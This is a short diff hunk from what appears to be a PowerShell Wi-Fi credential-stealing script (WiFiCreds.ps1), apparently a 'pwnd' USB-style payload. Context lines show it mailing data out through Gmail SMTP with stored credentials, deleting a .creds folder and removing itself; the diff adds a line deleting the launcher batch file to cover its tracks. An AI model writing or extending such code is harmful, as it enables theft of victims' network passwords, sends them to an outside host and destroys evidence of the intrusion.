@@ -18,6 +18,8 @@ Send-MailMessage -SmtpServer smtp.gmail.com -port 587 -Credential $cred -UseSsl 
 
 #Delete folder
 del -r .creds
+#Delete batch file
+del pwnd.bat
 
 #Self Destruct Script from pc
 Remove-Item WiFiCreds.ps1 -Force 
